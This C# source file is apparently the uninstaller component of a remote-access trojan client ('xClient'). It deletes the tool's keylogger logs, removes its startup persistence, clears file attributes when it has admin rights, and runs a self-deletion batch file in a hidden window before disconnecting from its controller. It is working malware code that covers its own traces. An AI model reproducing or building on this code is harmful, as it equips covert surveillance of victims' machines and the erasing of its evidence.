using System.Diagnostics;
using System.IO;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Installation
{
    public static class ClientUninstaller
    {
        public static void Uninstall(Client client)
        {
            if (!Settings.INSTALL)
            {
                new Packets.ClientPackets.SetStatus("Can not uninstall client. Installation was not enabled.").Execute(client);
                return;
            }

            RemoveExistingLogs();

            if (Settings.STARTUP)
                Startup.RemoveFromStartup();

            try
            {
                DirectoryInfo dir = new DirectoryInfo(ClientData.InstallPath);

                if (dir.Exists)
                {
                    // Directory is marked as read-only, so we must remove it.
                    if ((dir.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        if (WindowsAccountHelper.GetAccountType() == "Admin")
                        {
                            foreach (FileInfo file in dir.GetFiles())
                            {
                                try
                                {
                                    // Try to set the files in the folder to normal so they can be deleted.
                                    file.Attributes = FileAttributes.Normal;
                                }
                                catch
                                { }
                            }
                        }
                        else
                        {
                            // We need admin privileges to strip this directory of the read-only attribute...
                            return;
                        }
                    }
                }

                string batchFile = FileHelper.CreateUninstallBatch(Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile)) return;

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
            }
            finally
            {
                ClientData.Disconnect = true;
                client.Disconnect();
            }
        }

        public static void RemoveExistingLogs()
        {
            if (Directory.Exists(Keylogger.LogDirectory)) // try to delete Logs from Keylogger
            {
                try
                {
                    Directory.Delete(Keylogger.LogDirectory, true);
                }
                catch
                {
                }
            }
        }
    }
}
